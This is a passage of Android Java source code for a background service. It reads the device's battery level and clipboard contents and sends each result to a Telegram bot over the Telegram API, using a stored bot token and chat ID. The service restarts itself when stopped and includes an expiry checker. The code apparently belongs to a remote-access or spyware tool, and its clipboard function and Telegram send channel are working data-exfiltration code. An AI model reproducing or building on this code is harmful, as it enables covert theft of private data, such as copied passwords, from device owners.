            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);

            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

            if (level != -1 && scale != -1) {
                float batteryPct = level / (float) scale * 100;
                send("Battery Level: " + String.valueOf((int) batteryPct) + "%");
            } else {
                send("Could not retrieve battery level.");
            }
        } catch (Exception e) {
            send("Error checking battery: " + e.getMessage());
            Log.e(TAG, "Error checking battery: " + e.getMessage(), e);
        }
    }

    
    
    private void getClipboardData() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                ClipData clipData = clipboard.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    ClipData.Item item = clipData.getItemAt(0);
                    CharSequence text = item.coerceToText(this);  // safer than getText()
                    if (text != null) {
                        send("Clipboard Data: " + text.toString());
                    } else {
                        send("Clipboard Data: (Non-text content)");
                    }
                } else {
                    send("Clipboard Data: Empty");
                }
            } else {
                send("Clipboard Data: Empty");
            }
        } catch (Exception e) {
            send("Error getting clipboard data: " + e.getMessage());
            Log.e(TAG, "Error getting clipboard data: " + e.getMessage(), e);
        }
    }
    

    private void send(final String msg) {
        executorService.submit(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (chatId != null && !chatId.isEmpty()) {
                            String encodedMsg = URLEncoder.encode(msg, "UTF-8");
                            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodedMsg);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder result = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null)
                                result.append(line);
                            reader.close();
                            conn.disconnect();
                            Log.d(TAG, "Telegram API Response (User Bot): " + result.toString());
                        } else {
                            Log.w(TAG, "Chat ID is null or empty. Cannot send message: " + msg);
                        }
                    } catch (UnsupportedEncodingException e) {
                        Log.e(TAG, "Encoding error (user bot send): " + e.getMessage(), e);
                    } catch (MalformedURLException e) {
                        Log.e(TAG, "Malformed URL (user bot send): " + e.getMessage(), e);
                    } catch (IOException e) {
                        Log.e(TAG, "IO Exception (user bot send): " + e.getMessage(), e);
                    } catch (Exception e) {
                        Log.e(TAG, "Unexpected error (user bot send): " + e.getMessage(), e);
                    }
                }
            });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        if (executorService != null) {
            executorService.shutdownNow();
        }
        stopRinging();
        if (expiryChecker != null) {
            expiryChecker.stopCheckingExpiry();
        }
    }
}
